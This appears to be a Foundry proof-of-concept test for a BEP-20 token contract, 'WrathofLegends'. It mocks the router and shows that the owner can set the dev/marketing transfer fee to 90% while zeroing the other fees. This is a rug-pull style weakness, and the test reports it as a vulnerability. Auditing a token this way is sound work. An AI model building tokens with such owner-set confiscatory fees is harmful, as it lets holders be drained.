// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/WrathofLegends.sol";

contract MockWETH {
    // Minimal WETH implementation for testing
}

contract MockFactory {
    address public pairAddress;
    
    constructor(address _pairAddress) {
        pairAddress = _pairAddress;
    }
    
    function createPair(address, address) external view returns (address) {
        return pairAddress;
    }
}

contract MockPair {
    // Minimal pair implementation for testing
}

contract MockRouter {
    address public immutable factoryContract;
    address public immutable WETHContract;
    
    constructor(address _factory, address _weth) {
        factoryContract = _factory;
        WETHContract = _weth;
    }
    
    function factory() external view returns (address) {
        return factoryContract;
    }
    
    function WETH() external view returns (address) {
        return WETHContract;
    }
}

contract WrathOfLegendsTest is Test {
    WrathofLegends token;
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address owner = 0xfae03Ca5CED4900BBD3Cf8BF2b7dE4fc42f1592b;

    function setUp() public {
        // Deploy mocks
        vm.startPrank(owner);
        MockWETH mockWETH = new MockWETH();
        MockPair mockPair = new MockPair();
        MockFactory mockFactory = new MockFactory(address(mockPair));
        MockRouter mockRouter = new MockRouter(address(mockFactory), address(mockWETH));

        // Mock the router at hardcoded address
        vm.etch(ROUTER, address(mockRouter).code);
        
        // Deploy token
        token = new WrathofLegends();
        vm.stopPrank();
    }

    function testFeeBypassVulnerability() public {
        console2.log("--- BEFORE-Trigger Fees ---");
        // Query initial fee percentages
        uint256 devFeeBefore = token._devmarketingFee();
        uint256 liqFeeBefore = token._liquidityFee();
        uint256 taxFeeBefore = token._taxFee();
        
        console2.log("Initial DevMarketing Fee:", devFeeBefore);
        console2.log("Initial Liquidity Fee:", liqFeeBefore);
        console2.log("Initial Tax Fee:", taxFeeBefore);

        console2.log("--- TRIGGER: Setting Fees ---");
        vm.startPrank(owner);
        // Attempt to set excessive fees
        token.setDevMarketingFeePercent(90);
        token.setLiquidityFeePercent(0);
        token.setTaxFeePercent(0);
        vm.stopPrank();

        console2.log("--- AFTER-Trigger Fees ---");
        // Query fee percentages after manipulation attempt
        uint256 devFeeAfter = token._devmarketingFee();
        uint256 liqFeeAfter = token._liquidityFee();
        uint256 taxFeeAfter = token._taxFee();
        
        console2.log("Updated DevMarketing Fee:", devFeeAfter);
        console2.log("Updated Liquidity Fee:", liqFeeAfter);
        console2.log("Updated Tax Fee:", taxFeeAfter);

        // Check if fees were set as expected (90,0,0)
        bool exploitSuccess = devFeeAfter == 90 && 
                            liqFeeAfter == 0 && 
                            taxFeeAfter == 0;

        // Final vulnerability verdict
        if (exploitSuccess) {
            console2.log("Vulnerability Exists: Fee bypass successful (set to 90%,0%,0%)");
        } else {
            console2.log("Vulnerability not Exist: Fees not set to expected values");
        }
    }
}